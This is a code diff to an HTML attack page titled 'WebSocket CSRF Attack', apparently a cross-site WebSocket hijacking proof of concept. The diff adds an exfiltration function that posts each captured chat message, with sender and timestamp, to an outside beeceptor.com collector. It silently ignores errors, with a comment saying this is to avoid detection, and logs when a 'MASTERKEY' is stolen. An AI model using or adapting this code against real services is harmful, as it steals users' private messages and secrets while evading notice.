@@ -15,7 +15,7 @@
     <div class="container">
         <h1>WebSocket CSRF Attack</h1>
         <button onclick="executeCSRFAttack()">Execute Attack</button>
-        <div id="stolen-data"></div>a
+        <div id="stolen-data"></div>
         <div id="output"></div>
     </div>
 
@@ -33,9 +33,22 @@
             msgDiv.innerHTML = `<strong>${from}:</strong> ${message}`;
             div.appendChild(msgDiv);
             
+            // Exfiltrate message to attacker server
+            exfiltrateData({ from, message, timestamp: new Date().toISOString() });
+            
             if (message.includes('MASTERKEY')) {
                 log('🎯 MASTERKEY STOLEN!');
             }
+        }
+
+        function exfiltrateData(data) {
+            fetch('https://fadsf.free.beeceptor.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            }).catch(() => {}); // Ignore errors to avoid detection
         }
 
         function executeCSRFAttack() {
